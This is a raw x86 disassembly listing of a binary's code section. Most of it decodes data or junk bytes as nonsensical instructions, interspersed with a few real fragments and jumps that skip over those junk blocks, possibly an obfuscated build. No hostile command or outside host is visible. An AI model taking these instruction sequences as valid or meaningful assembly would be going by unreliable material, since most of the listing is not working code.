  406cdd:	imul   ebp,DWORD PTR [eax-0x43],0xd
  406ce1:	icebp  
  406ce2:	cmp    BYTE PTR [ebx],0xcb
  406ce5:	stos   DWORD PTR es:[edi],eax
  406ce6:	(bad)  [ecx+edi*4+0x60]
  406cea:	jae    0x406d35
  406cec:	ins    BYTE PTR es:[edi],dx
  406ced:	mov    fs,WORD PTR [esi+0x79]
  406cf0:	nop    DWORD PTR [ecx-0x65c4baec]
  406cf7:	dec    esp
  406cf8:	mov    cl,0xd6
  406cfa:	xor    al,0x96
  406cfc:	sbb    bh,BYTE PTR [eax+0x30e6349d]
  406d02:	jne    0x406caa
  406d04:	pusha  
  406d05:	mov    esi,DWORD PTR [edx]
  406d07:	test   al,0x27
  406d09:	inc    ebx
  406d0a:	mov    ah,0x93
  406d0c:	jnp    0x406d55
  406d0e:	mov    eax,0x9bcacd7f
  406d13:	adc    ch,BYTE PTR [ebp+0x79355574]
  406d19:	jmp    0x406d09
  406d1b:	test   eax,0x5e137f62
  406d20:	xor    eax,0xfa9645d8
  406d25:	scas   eax,DWORD PTR es:[edi]
  406d26:	jnp    0x48ca6571
  406d2c:	add    DWORD PTR [edx+0x4d8bff45],ecx
  406d32:	clc    
  406d33:	xor    al,0x49
  406d35:	sub    al,0x35
  406d37:	mov    BYTE PTR [ecx],al
  406d39:	lea    eax,[ebp-0x8]
  406d3c:	inc    BYTE PTR [eax]
  406d3e:	inc    eax
  406d3f:	push   eax
  406d40:	pop    ecx
  406d41:	dec    ecx
  406d42:	xchg   ecx,edx
  406d44:	dec    BYTE PTR [edx]
  406d46:	push   DWORD PTR [ebp-0x10]
  406d49:	mov    eax,ds:0x44525c
  406d4e:	mov    eax,DWORD PTR [eax]
  406d50:	push   DWORD PTR [eax]
  406d52:	lea    eax,ds:0x445278
  406d58:	jmp    0x406e84
  406d5d:	scas   eax,DWORD PTR es:[edi]
  406d5e:	stos   DWORD PTR es:[edi],eax
  406d5f:	fs pop ds
  406d61:	js     0x406d46
  406d63:	addr16 mov ebx,0xcd1c5374
  406d69:	dec    eax
  406d6a:	fmul   DWORD PTR [esi+0x76]
  406d6d:	xor    al,0x3d
  406d6f:	jl     0x406ded
  406d71:	or     eax,0xe7c7c7f
  406d76:	push   ebp
  406d77:	mov    ebx,0x2f69704c
  406d7c:	cwde   
  406d7d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406d7e:	js     0x406d8e
  406d80:	rcr    DWORD PTR ds:0xbe019431,1
  406d86:	out    dx,eax
  406d87:	inc    edx
  406d88:	mov    ah,0x27
  406d8a:	sub    eax,0x82fe8c65
  406d8f:	push   ss
  406d90:	mov    cl,0x11
  406d92:	push   0x4e3e77eb
  406d97:	pop    esp
  406d98:	pop    edi
  406d99:	in     al,0xd0
  406d9b:	nop
  406d9c:	in     eax,0x20
  406d9e:	lods   eax,DWORD PTR ds:[esi]
  406d9f:	push   edx
  406da0:	jmp    0x406d2a
  406da2:	mov    esi,0x709db50c
  406da7:	jge    0x406e1b
  406da9:	sar    BYTE PTR [ecx+0x0],cl
  406dac:	stos   DWORD PTR es:[edi],eax
  406dad:	sar    WORD PTR ds:0x8842e5de,1
  406db4:	cmp    ebp,edi
  406db6:	cmp    al,0xe
  406db8:	aam    0x5d
  406dba:	in     al,0x54
  406dbc:	out    0xab,eax
  406dbe:	xor    al,0xcf
  406dc0:	push   ds
  406dc1:	jb     0x406da0
  406dc3:	popa   
  406dc4:	adc    eax,0x41693a5
  406dc9:	inc    ebp
  406dca:	and    BYTE PTR es:[ecx],0x2
  406dce:	loope  0x406e3e
  406dd0:	add    eax,0xd3dc739e
  406dd5:	ja     0x406e10
  406dd7:	clc    
  406dd8:	out    0xbe,al
  406dda:	jbe    0x406dce
  406ddc:	rcr    BYTE PTR [esi-0x4d33aace],1
  406de2:	rcl    DWORD PTR [esi+0x4a7ad227],1
  406de8:	je     0x406d8d
  406dea:	jbe    0x406e30
  406dec:	push   cs
  406ded:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406dee:	mov    ds:0xbf33486f,eax
  406df3:	fstp   TBYTE PTR [edi-0x4b]
  406df6:	xchg   esp,eax
  406df7:	stos   DWORD PTR es:[edi],eax
  406df8:	mov    bh,0xa3
  406dfa:	fisub  WORD PTR [ebx-0x61]
  406dfd:	stos   DWORD PTR es:[edi],eax
  406dfe:	mov    ds:0x5ee91d5e,eax
  406e03:	push   esi
  406e04:	cmc    
  406e05:	mov    al,BYTE PTR [edx+edi*2]
  406e08:	jno    0x406e40
  406e0a:	xor    BYTE PTR [ebx],dh
  406e0c:	clc    
  406e0d:	sbb    BYTE PTR [ecx-0x28],bh
  406e10:	pusha  
  406e11:	lods   eax,DWORD PTR ds:[esi]
  406e12:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406e13:	mov    ?,WORD PTR [esp+eax*8+0x47435fb2]
  406e1a:	fwait
  406e1b:	pop    eax
  406e1c:	add    eax,0xb460417e
  406e21:	ret    
  406e22:	das    
  406e23:	arpl   WORD PTR [edx-0x43],si
  406e26:	stc    
  406e27:	or     DWORD PTR [esi+0x5d85ef6b],edx
  406e2d:	fdivp  st(1),st
  406e2f:	or     bl,ah
  406e31:	lods   eax,DWORD PTR ds:[esi]
  406e32:	xchg   edx,eax
  406e33:	inc    esp
  406e34:	shl    edi,1
  406e36:	in     al,dx
  406e37:	ror    BYTE PTR [ecx-0x164f422a],0x89
  406e3e:	fdivr  DWORD PTR [edx+0xb]
  406e41:	fimul  WORD PTR [esi+0x4b]
  406e44:	add    BYTE PTR [ebx-0x3be6aae0],dh
  406e4a:	pop    ebp
  406e4b:	cdq    
  406e4c:	fist   DWORD PTR [eax]
  406e4e:	imul   eax,edi,0x746d9088
  406e54:	add    ch,BYTE PTR [edx]
  406e56:	out    0x62,al
  406e58:	push   ecx
  406e59:	jne    0x406e5d
  406e5b:	dec    ecx
  406e5c:	loop   0x406e65
  406e5e:	jp     0x406ecd
  406e60:	adc    edi,edx
  406e62:	inc    esp
  406e63:	in     al,0x4f
  406e65:	cmp    BYTE PTR [eax+ecx*4],dh
  406e68:	std    
  406e69:	xchg   DWORD PTR [ebp+0x6356b3c0],ebp
  406e6f:	adc    DWORD PTR [ebp+0x7f386149],edi
  406e75:	data16 icebp 
  406e77:	xor    eax,DWORD PTR [ebp+0x14]
  406e7a:	push   ecx
  406e7b:	and    BYTE PTR [esi],0x99
  406e7e:	pop    ebp
  406e7f:	jge    0x406ecd
  406e81:	mov    ch,0x9
  406e83:	mov    eax,0x58d30ff
  406e88:	and    al,0x50
  406e8a:	inc    esp
  406e8b:	add    bh,bh
  406e8d:	xor    BYTE PTR [ebp+0x44525805],cl
  406e93:	add    bh,bh
  406e95:	xor    BYTE PTR [ebp+0x44534805],cl
  406e9b:	add    bh,bh
  406e9d:	xor    BYTE PTR [edi-0x16bcbc2d],al
  406ea3:	daa    
  406ea4:	add    DWORD PTR [eax],eax
  406ea6:	add    BYTE PTR [ecx],bl
  406ea8:	retf   
  406ea9:	mov    ecx,0xd9627d6c
  406eae:	ins    DWORD PTR es:[edi],dx
  406eaf:	lods   al,BYTE PTR ds:[esi]
  406eb0:	test   eax,0x9c8f7590
  406eb5:	xchg   ecx,eax
  406eb6:	pop    es
  406eb7:	lds    edi,FWORD PTR [esp+edi*2]
  406eba:	jl     0x406ec9
  406ebc:	jg     0x406f3a
  406ebe:	jl     0x406e74
  406ec0:	push   ebp
  406ec1:	in     eax,dx
  406ec2:	and    BYTE PTR [edi+0x2e],ch
  406ec5:	es ret 0xb7e7
  406ec9:	scas   eax,DWORD PTR es:[edi]
  406eca:	push   ecx
  406ecb:	pop    edx
  406ecc:	nop
  406ecd:	dec    edi
  406ece:	pushf  
  406ecf:	mov    WORD PTR [edx+0x4e],ds
  406ed2:	frstor [ebp+0x1f]
  406ed5:	add    al,0xd7
  406ed7:	pop    edx
  406ed8:	cmp    bl,bl
  406eda:	hlt    
  406edb:	jecxz  0x406ed2
  406edd:	push   esp
  406ede:	ja     0x406ef3
  406ee0:	jbe    0x406ed6
  406ee2:	fstp   TBYTE PTR [edx-0x1e]
  406ee5:	ret    
  406ee6:	sbb    al,0x9e
  406ee8:	fbstp  TBYTE PTR [esi-0x66]
  406eeb:	jg     0x406ec1
  406eed:	cmp    DWORD PTR [edx],eax
  406eef:	push   0xbe1def15
  406ef4:	adc    al,0x17
  406ef6:	(bad)  
  406ef7:	inc    ecx
  406ef8:	jbe    0x406ea9
  406efa:	lods   al,BYTE PTR ds:[esi]
  406efb:	sbb    al,0x63
  406efd:	fnstenv ss:[edx+0x34bcd317]
  406f04:	sbb    BYTE PTR [ecx],dl
  406f06:	jns    0x406f7c
  406f08:	jo     0x406f45
  406f0a:	out    0x7a,eax
  406f0c:	in     eax,dx
  406f0d:	idiv   BYTE PTR [edx+ebp*1]
  406f10:	shl    DWORD PTR [ebx+eax*4],0x2
  406f14:	xchg   edx,eax
  406f15:	test   BYTE PTR [eax],bl
  406f17:	rol    ebp,0x52
  406f1a:	fbld   TBYTE PTR ds:0x2ea0bf02
  406f20:	sbb    eax,0xdba4fd10
  406f25:	xchg   edx,ebx
  406f27:	jmp    0xf51538f4
  406f2c:	xchg   ecx,eax
  406f2d:	add    eax,0xbee37a19
  406f32:	call   0x5313:0x40cf1163
  406f39:	ds inc edx
  406f3b:	(bad)  
  406f3c:	cdq    
  406f3d:	xchg   ebx,eax
  406f3e:	and    DWORD PTR [ecx],eax
  406f40:	inc    edx
  406f41:	add    eax,0x6bb3bf81
  406f46:	mov    fs,WORD PTR [eax-0x3d]
  406f49:	dec    esp
  406f4a:	add    DWORD PTR [ebx+0x5],0x2
  406f4e:	sar    BYTE PTR [eax],1
  406f50:	fst    DWORD PTR [ebp-0xd]
  406f53:	dec    edi
  406f54:	pop    eax
  406f55:	xor    DWORD PTR [ebp+0x8],esp
  406f58:	dec    ebp
  406f59:	call   ebx
  406f5b:	sub    eax,0x29b33653
  406f60:	jmp    0xd724:0x61dfa679
  406f67:	retf   
  406f68:	sahf   
  406f69:	jp     0x406f38
  406f6b:	cdq    
  406f6c:	shl    DWORD PTR [edx+0x568a9c3f],cl
  406f72:	push   0xffffffcd
  406f74:	lahf   
  406f75:	out    0x8d,eax
  406f77:	iret   
  406f78:	push   ebx
  406f79:	faddp  st(7),st
  406f7b:	xor    DWORD PTR [eax+0x1b],edx
  406f7e:	test   eax,0xcc24447a
  406f83:	mov    eax,ds:0xa7dad1a
  406f88:	mov    bl,0xbe
  406f8a:	sbb    ch,BYTE PTR [esi]
  406f8c:	xchg   ebp,edx
  406f8e:	mov    ds:0x9f398f85,al
  406f93:	adc    bh,dl
  406f95:	or     edx,ebx
  406f97:	mov    ebx,0x9f170dfd
  406f9c:	fldenv [ecx-0x37]
  406f9f:	test   DWORD PTR fs:[esi+0x5fc96d3a],ebp
  406fa6:	xor    eax,0x29488fb7
  406fab:	inc    di
  406fad:	mov    ebp,0x12be5be4
  406fb2:	and    bh,dl
  406fb4:	pop    es
  406fb5:	ss jbe 0x406f6c
  406fb8:	jle    0x406fba
  406fba:	add    DWORD PTR [ebx],esi
  406fbc:	fistp  WORD PTR [ecx]
  406fbe:	cmp    dh,dl
  406fc0:	dec    esp
  406fc1:	mov    ecx,ecx
  406fc3:	pop    ebp
  406fc4:	iret   
  406fc5:	sti    
  406fc6:	rol    BYTE PTR [eax-0x56f3aec2],1
  406fcc:	pop    esi
  406fcd:	cmc    
  406fce:	sub    ebx,0x3
  406fd1:	push   ebx
  406fd2:	pop    eax
  406fd3:	call   DWORD PTR [eax+0x1]
  406fd6:	mov    eax,DWORD PTR [ebp-0x20]
  406fd9:	mov    ecx,DWORD PTR ds:0x44521c
  406fdf:	jmp    0x40710b
  406fe4:	gs jg  0x406fc0
  406fe7:	add    DWORD PTR [ebp-0x27],edi
  406fea:	jge    0x40703f
  406fec:	jecxz  0x406fd1
  406fee:	stos   DWORD PTR es:[edi],eax
  406fef:	ins    BYTE PTR es:[edi],dx
  406ff0:	cmp    al,0x39
  406ff2:	xchg   DWORD PTR [edi],edx
  406ff4:	sar    BYTE PTR [edi],cl
  406ff6:	jl     0x407074
  406ff8:	or     eax,0xca7c7c7f
  406ffd:	inc    esp
  406ffe:	mov    dh,0x3b
  407000:	lahf   
  407001:	mov    cl,0x31
  407003:	scas   al,BYTE PTR es:[edi]
  407004:	pmaxsw mm0,QWORD PTR [eax-0x78932eb0]
  40700b:	popf   
  40700c:	fucom  st(3)
  40700e:	ins    DWORD PTR es:[edi],dx
  40700f:	mov    ebx,0x8ca77604
  407015:	push   ebx
  407016:	iret   
  407017:	retf   
  407018:	bound  eax,QWORD PTR [ebp-0x57]
  40701b:	inc    ebx
  40701c:	and    al,0x34
  40701e:	cmp    BYTE PTR [ecx-0x48f2bce8],dl
  407024:	sbb    cl,bh
  407026:	bound  esp,QWORD PTR ds:0x91cb3ea8
  40702c:	(bad)  
  40702d:	xchg   edi,eax
  40702e:	push   cs
  40702f:	sub    al,0x66
  407031:	ins    BYTE PTR es:[edi],dx
  407032:	and    dh,ch
  407034:	les    eax,FWORD PTR ds:0xf132d274
  40703a:	xor    BYTE PTR [ebp+0x24],dl
  40703d:	shr    DWORD PTR [ebx+0x5370b066],0xf4
  407044:	add    eax,DWORD PTR [eax+0xce28935]
  40704a:	rcl    al,cl
  40704c:	ss cmp edx,ecx
  40704f:	stc    
  407050:	and    bh,BYTE PTR [ecx]
  407052:	loopne 0x407002
  407054:	ror    DWORD PTR [ebp-0x24],cl
  407057:	scas   al,BYTE PTR es:[edi]
  407058:	loop   0x4070c4
  40705a:	mov    ch,0xe
  40705c:	xchg   edi,eax
  40705d:	sub    ebp,ebx
  40705f:	jl     0x4070a4
  407061:	pop    ebp
  407062:	push   ebp
  407063:	push   0xc119ebaf
  407068:	push   esi
  407069:	mov    bl,0x64
  40706b:	adc    dh,BYTE PTR [edi+ebp*4+0x375a2e43]
  407072:	push   ds
  407073:	xchg   esi,eax
  407074:	jbe    0x407021
  407076:	enter  0x13cf,0x24
  40707a:	mov    ecx,0x7fbe8ef3
  40707f:	dec    ebp
  407080:	or     eax,0xeeda8e44
  407085:	mov    bl,0x71
  407087:	add    dl,BYTE PTR [ecx-0xe886fd3]
  40708d:	add    DWORD PTR [eax],esi
  40708f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407090:	aad    0xb2
  407092:	or     BYTE PTR [ebx+ebp*4-0x1ed7385e],bl
  407099:	loopne 0x4070d0
  40709b:	(bad)
  40709e:	call   0xdd8:0x499707c9
  4070a5:	in     al,dx
  4070a6:	push   cs
  4070a7:	div    DWORD PTR ss:[esi-0x21048418]
  4070ae:	fwait
  4070af:	add    eax,0x2b8c54e
  4070b4:	(bad)  
  4070b5:	daa    
  4070b6:	push   edx
  4070b7:	loope  0x4070cd
  4070b9:	sbb    DWORD PTR [ebp+0x6b216217],ebx
  4070bf:	cmc    
  4070c0:	lds    eax,FWORD PTR [esi+edi*2]
  4070c3:	in     al,0xb
  4070c5:	int    0xa7
  4070c7:	adc    al,0xd7
  4070c9:	mov    al,ds:0x2e76f226
  4070ce:	pop    esi
  4070cf:	jnp    0x40708d
  4070d1:	fs jl  0x40707b
  4070d4:	icebp  
  4070d5:	adc    cl,BYTE PTR [esi-0x2ba74150]
  4070db:	xchg   ebp,eax
  4070dc:	adc    esi,edi
  4070de:	int3   
  4070df:	inc    edx
  4070e0:	(bad)  
  4070e1:	jo     0x407100
  4070e3:	ret    
  4070e4:	iret   
  4070e5:	inc    esi
  4070e6:	int    0xa8
  4070e8:	push   0xd90faa1f
  4070ed:	mov    dl,0xac
  4070ef:	xbegin 0xbd222978
  4070f5:	jnp    0x407090
  4070f7:	imul   esi,ecx,0xfffffff3
  4070fa:	out    0x6b,eax
  4070fc:	pop    edx
  4070fd:	je     0x4070d2
  4070ff:	sub    eax,0x31be84ee
  407104:	jmp    ecx
  407106:	jo     0x407115
  407108:	pushf  
  407109:	stc    
  40710a:	jno    0x40710d
  40710c:	or     BYTE PTR [edi+0x5e],bl
  40710f:	pop    ebx
  407110:	leave  
  407111:	ret    
  407112:	push   ebp
  407113:	mov    ebp,esp
  407115:	sub    esp,0x2c
  407118:	xor    eax,0x6ce
  40711d:	mov    DWORD PTR [ebp-0x8],0xf89c8534
  407124:	mov    DWORD PTR [ebp-0x14],0xf89c8535
  40712b:	or     DWORD PTR ds:0x44e414,0x5a5
  407135:	jmp    0x40726c
  40713a:	push   ds
  40713b:	repz lock adc al,0x95
  40713f:	pop    ss
  407140:	stos   BYTE PTR es:[edi],al
  407141:	lea    edi,[esi+0x16]
  407144:	nop
  407145:	push   ebx
  407146:	pop    ebx
  407147:	(bad)
  40714b:	ds jl  0x4071ca
  40714e:	push   es
  40714f:	jg     0x4071cd
  407151:	jl     0x407152
  407153:	xchg   edi,eax
  407154:	(bad)  
  407155:	sbb    edi,DWORD PTR [eax+0x60e0e17a]
  40715b:	clc    
  40715c:	aas    
  40715d:	push   ds
  40715e:	out    0x88,al
  407160:	(bad)  
  407161:	jmp    0x2db1488f
  407166:	mov    ebp,0x5d8db134
  40716b:	mov    BYTE PTR [edi*2+0x370b5e05],dh
  407172:	cmp    dh,dh
  407174:	dec    ebp
  407175:	pop    edi
  407176:	cmp    eax,0x2399d41e
  40717b:	jmp    0x1e15bd39
  407180:	mov    ds:0x603dfd2,al
  407185:	enter  0x98c0,0x74
  407189:	int    0x47
  40718b:	lods   al,BYTE PTR ds:[esi]
  40718c:	scas   eax,DWORD PTR es:[edi]
  40718d:	push   ss
  40718e:	rcr    DWORD PTR [edx-0x63],1
  407191:	mov    ch,0xed
  407193:	aad    0xfd
  407195:	ret    0xe991
  407198:	shl    DWORD PTR [edx],cl
  40719a:	inc    eax
  40719b:	sar    DWORD PTR [esi+eax*2],cl
  40719e:	sub    ah,BYTE PTR [ecx-0x31279d6d]
  4071a4:	jmp    0x2502:0x9529a55c
  4071ab:	xor    bh,BYTE PTR [ecx-0x1b]
  4071ae:	pop    ebp
  4071af:	xchg   edi,eax
  4071b0:	push   cs
  4071b1:	pop    edi
  4071b2:	outs   dx,BYTE PTR ds:[esi]
  4071b3:	push   eax
  4071b4:	loopne 0x407229
  4071b6:	dec    esi
  4071b7:	push   ebp
  4071b8:	je     0x40713e
  4071ba:	loope  0x40716a
  4071bc:	xchg   ebx,eax
  4071bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4071be:	loopne 0x4071e2
  4071c0:	mov    cl,0x72
  4071c2:	inc    edi
  4071c3:	cs nop
  4071c5:	lahf   
  4071c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4071c7:	sbb    BYTE PTR [edx+ebx*1-0x3e],cl
  4071cb:	mov    eax,ds:0x18565642
  4071d0:	push   edi
  4071d1:	pop    ds
  4071d2:	cmp    al,BYTE PTR [ecx]
  4071d4:	jo     0x4071a7
  4071d6:	sbb    al,0x8f
  4071d8:	in     al,dx
  4071d9:	xchg   ebp,eax
  4071da:	or     bh,BYTE PTR [ecx]
  4071dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4071dd:	adc    edx,ecx
  4071df:	dec    ecx
  4071e0:	repnz and ecx,DWORD PTR [edx]
  4071e3:	ins    DWORD PTR es:[edi],dx
  4071e4:	fisub  WORD PTR [ebx+eax*1-0x53]
  4071e8:	add    ch,BYTE PTR [eax-0x42529f30]
  4071ee:	jbe    0x4071f8
  4071f0:	xchg   BYTE PTR [edi+0x7d6c496c],al
  4071f6:	jbe    0x4071f9
  4071f8:	pop    eax
  4071f9:	addr16 jge 0xa23d7345
  407200:	jae    0x407192
  407202:	or     BYTE PTR [edx+ebp*8+0x50ebd39],ah
  407209:	out    0x57,al
  40720b:	inc    ebp
  40720c:	rol    DWORD PTR [eax],cl
  40720e:	cmp    al,0xa2
  407210:	(bad)  
  407211:	xor    BYTE PTR [esi+0x2b],al
  407214:	call   0x28ab:0x9d0b95db
  40721b:	sbb    al,0x86
  40721d:	push   esi
  40721e:	cmp    BYTE PTR [ecx+esi*8+0x41],ah
  407222:	pop    es
  407223:	or     DWORD PTR [edx],eax
  407225:	adc    ebp,DWORD PTR [edi]
  407227:	xchg   ebp,eax
  407228:	(bad)  
  407229:	mov    ch,0x7a
  40722b:	pusha  
  40722c:	test   al,0x6f
  40722e:	push   0xc71b9772
  407233:	jmp    FWORD PTR [ebx+0xf71f00c]
  407239:	sahf   
  40723a:	sahf   
  40723b:	popf   
  40723c:	xor    BYTE PTR es:[ebx+0x4885ceab],ah
  407243:	daa    
  407244:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407245:	es xor edi,ebp
  407248:	fisttp WORD PTR [ecx+eiz*1]
  40724b:	sti    
  40724c:	jns    0x4072b2
  40724e:	ds stos DWORD PTR es:[edi],eax
  407250:	xor    ecx,DWORD PTR [eax+0x26]
  407253:	pop    esp
  407254:	cmp    esp,esi
  407256:	xchg   esi,eax
  407257:	ret    0x3639
  40725a:	sbb    dl,BYTE PTR [edx]
  40725c:	jbe    0x407251
  40725e:	dec    esp
  40725f:	sbb    eax,0x4770d58d
  407264:	je     0x40721d
  407266:	rcl    BYTE PTR [eax],1
  407268:	ja     0x407258
  40726a:	rsm    
  40726c:	mov    eax,0x9507
  407271:	and    DWORD PTR ds:0x41074f,0x0
  40727b:	mov    ecx,DWORD PTR ds:0x41074f
  407281:	inc    ecx
  407282:	mov    DWORD PTR ds:0x41074f,ecx
  407288:	cmp    DWORD PTR ds:0x41074f,0x20
  40728f:	jne    0x4072a0
  407295:	push   0x42484c
  40729a:	call   DWORD PTR ds:0x44336c
  4072a0:	cmp    DWORD PTR ds:0x41074f,0x10
  4072a7:	jb     0x40727b
  4072ad:	or     DWORD PTR ds:0x44b6dc,0x61e1
  4072b7:	mov    WORD PTR [ebp-0x4],ax
  4072bb:	xor    DWORD PTR ds:0x44b6e0,0xdd9
  4072c5:	lea    eax,[ebp-0x24]
  4072c8:	and    ecx,DWORD PTR ds:0x44b6d8
  4072ce:	jmp    0x407405
  4072d3:	div    DWORD PTR [eax]
  4072d5:	test   BYTE PTR [ebx],ah
  4072d7:	pop    ebx
  4072d8:	jnp    0x407285
  4072da:	js     0x407349
  4072dc:	ds xchg ebx,eax
  4072de:	mov    esp,0x4b28dc7b
  4072e3:	lea    esi,[ecx]
  4072e5:	jl     0x407363
  4072e7:	push   es
  4072e8:	jg     0x407366
  4072ea:	jl     0x40727f
  4072ec:	in     al,dx
  4072ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4072ee:	sub    ebx,DWORD PTR [edi+edx*2+0x28bbabe0]
  4072f5:	or     BYTE PTR [edx-0x60],ch
  4072f8:	mov    al,bl
  4072fa:	outs   dx,DWORD PTR ds:[esi]
  4072fb:	or     ah,cl
  4072fd:	add    esp,DWORD PTR [esi-0x3f198e9c]
  407303:	les    esp,FWORD PTR [edx]
  407305:	jle    0x4072d1
  407307:	xchg   eax,esi
  407309:	mov    dl,0xb4
  40730b:	outs   dx,BYTE PTR ds:[esi]
  40730c:	ds xchg esi,eax
  40730e:	cmp    cl,al
  407310:	dec    edx
  407311:	pop    eax
  407312:	cld    
  407313:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407315:	or     ch,bh
  407317:	ret    
  407318:	leave  
  407319:	icebp  
  40731a:	dec    ebp
  40731b:	sub    dh,BYTE PTR [ecx]
  40731d:	jno    0x4072ea
  40731f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407320:	sbb    al,0xbd
  407322:	and    eax,0x757f5e2f
  407327:	dec    ebx
  407329:	dec    edi
  40732a:	sub    al,0xc1
  40732c:	pusha  
  40732d:	mov    dl,0xf9
  40732f:	hlt    
  407330:	mov    eax,ds:0xd85aea37
  407335:	mov    bl,0x13
  407337:	xor    BYTE PTR [ebp+edx*4-0x7b5df2a5],0x37
  40733f:	inc    edx
  407340:	push   ss
  407341:	xor    edi,DWORD PTR [eax]
  407343:	js     0x40730b
  407345:	stc    
  407346:	ins    BYTE PTR es:[edi],dx
  407347:	sbb    cl,BYTE PTR [edx+0xc4172ea]
  40734d:	sub    edi,DWORD PTR [ebx-0x61]
  407350:	jl     0x407334
  407352:	xchg   esi,eax
  407353:	sub    WORD PTR [esi],dx
  407356:	pop    esi
  407357:	loope  0x4073b1
  407359:	mov    dh,BYTE PTR [eax]
  40735b:	daa    
  40735c:	cmp    BYTE PTR [edx+0x25],al
  40735f:	fnstcw WORD PTR [edx+edx*8]
  407362:	xor    esp,ecx
  407364:	cmp    al,0xb2
  407366:	dec    esp
  407367:	push   edi
  407368:	xor    ecx,DWORD PTR [eax]
  40736a:	fisttp DWORD PTR [edi]
  40736c:	lock icebp 
  40736e:	pusha  
  40736f:	mov    WORD PTR [esi],cs
  407371:	xchg   esi,eax
  407372:	daa    
  407373:	test   bh,dh
  407375:	jg     0x4073b8
  407377:	jae    0x407337
  407379:	mov    eax,0xf4b2baa
  40737e:	xchg   esp,eax
  40737f:	or     eax,edx
  407381:	mov    eax,ds:0xd3a2cd86
  407386:	std    
  407387:	pusha  
  407388:	mov    BYTE PTR [eax],ch
  40738a:	mov    edi,0xe5fad580
  40738f:	cmp    BYTE PTR [edx-0x4806969c],0xa
  407396:	aaa    
  407397:	jb     0x407367
  407399:	sub    eax,0xd6d2bfc8
  40739e:	jb     0x407343
  4073a0:	sub    DWORD PTR [edi+ebx*4-0x21],edi
  4073a4:	adc    esp,DWORD PTR [edx-0xd]
  4073a7:	sub    BYTE PTR [edx-0x50],0x10
  4073ab:	mov    esp,DWORD PTR [edi-0x789a5bc7]
  4073b1:	sub    esi,0xc5a13e08
  4073b7:	add    al,BYTE PTR [ebx+0x44]
  4073ba:	rcl    bl,0xe1
  4073bd:	das    
  4073be:	fldenv [ebx-0x17]
  4073c1:	pop    ecx
  4073c2:	pop    esi
  4073c3:	call   FWORD PTR [ecx+0x40]
  4073c6:	cs call 0x2394:0x86be610f
  4073ce:	into   
  4073cf:	ins    BYTE PTR es:[edi],dx
  4073d0:	and    eax,0xbe557173
  4073d5:	jns    0x407445
  4073d7:	je     0x40744c
  4073d9:	mov    eax,es
  4073db:	jno    0x4073df
  4073dd:	(bad)  
  4073de:	or     al,dh
  4073e0:	pop    esp
  4073e1:	xchg   ecx,eax
  4073e2:	sti    
  4073e3:	sti    
  4073e4:	rcr    BYTE PTR [ebp+0x1f25de15],0x8e
  4073eb:	call   0xb7d3559f
  4073f0:	rcl    BYTE PTR [eax],cl
  4073f2:	mov    ah,0xd
  4073f4:	push   eax
  4073f5:	pop    eax
  4073f6:	mov    esp,0xf1838bb
  4073fb:	sub    bl,bh
  4073fd:	mov    cl,al
  4073ff:	sub    eax,0x94f4771b
  407404:	push   ebx
  407405:	mov    DWORD PTR [ebp-0x28],eax
  407408:	jmp    0x40753f
  40740d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40740e:	(bad)  [ecx+0x67666966]
  407414:	fld    DWORD PTR [edx]
  407416:	xor    eax,0x2a49cc56
  40741b:	jg     0x40741c
  40741d:	xchg   edi,eax
  40741e:	xor    BYTE PTR [esp+edi*2+0x6],bh
  407422:	jg     0x4074a0
  407424:	jl     0x407434
  407426:	popa   
  407427:	inc    esi
  407428:	and    edx,DWORD PTR [ebp+0x7e069ca4]
  40742e:	xchg   edi,eax
  40742f:	mov    bl,0xc0
  407431:	add    eax,0xd8548b55
  407436:	ret    
  407437:	es inc ebx
  407439:	xchg   ch,bl
  40743b:	mov    esp,0x38995085
  407440:	inc    ebx
  407441:	dec    ebp
  407442:	icebp  
  407443:	pop    ds
  407444:	out    0xb9,al
  407446:	sbb    DWORD PTR [eax+esi*2],esi
  407449:	ins    BYTE PTR es:[edi],dx
  40744a:	jg     0x4073f3
  40744c:	fld    DWORD PTR [edx+0x73313fbe]
  407452:	fdivp  st(2),st
  407454:	xchg   esp,eax
  407455:	and    DWORD PTR [edx+0x1bcfc0e6],0x64
  40745c:	sub    BYTE PTR [edi+0x2af96a72],al
  407462:	hlt    
  407463:	xchg   edx,eax
  407464:	xlat   BYTE PTR ds:[ebx]
  407465:	in     eax,dx
  407466:	or     al,0x14
  407468:	sub    eax,DWORD PTR [esi-0x51d6e9c6]
  40746e:	in     al,0xb1
  407470:	push   es
  407471:	loope  0x407435
  407473:	out    0x81,eax
  407475:	pop    ds
  407476:	sbb    ah,BYTE PTR [ecx+0x7906428f]
  40747c:	fidiv  WORD PTR [esi-0x210e94af]
  407482:	fmul   st,st(5)
  407484:	pop    ds
  407485:	popf   
  407486:	add    al,BYTE PTR [ebp+0x7910d58c]
  40748c:	sbb    al,0x2d
  40748e:	pushf  
  40748f:	daa    
  407490:	push   ecx
  407491:	(bad)  
  407492:	test   DWORD PTR [ecx-0x72],0x757fe4a7
  407499:	addr16 fsubp st(7),st
  40749c:	out    dx,eax
  40749d:	sub    dh,ah
  40749f:	ins    DWORD PTR es:[edi],dx
  4074a0:	retf   
  4074a1:	cs and ch,dh
  4074a4:	fmul   DWORD PTR [esi+ebx*8-0x6fcae776]
  4074ab:	out    dx,al
  4074ac:	and    dl,BYTE PTR [esi-0xc]
  4074af:	add    bl,BYTE PTR [esp+esi*8]
  4074b2:	cwde   
  4074b3:	fstp   DWORD PTR [edi-0x10]
  4074b6:	cli    
  4074b7:	(bad)  
  4074b8:	ins    BYTE PTR es:[edi],dx
  4074b9:	data16 test al,ch
  4074bc:	js     0x40744a
  4074be:	scas   eax,DWORD PTR es:[edi]
  4074bf:	adc    BYTE PTR [edx+0x37],cl
  4074c2:	retf   
  4074c3:	es xchg ebx,eax
  4074c5:	ins    DWORD PTR es:[edi],dx
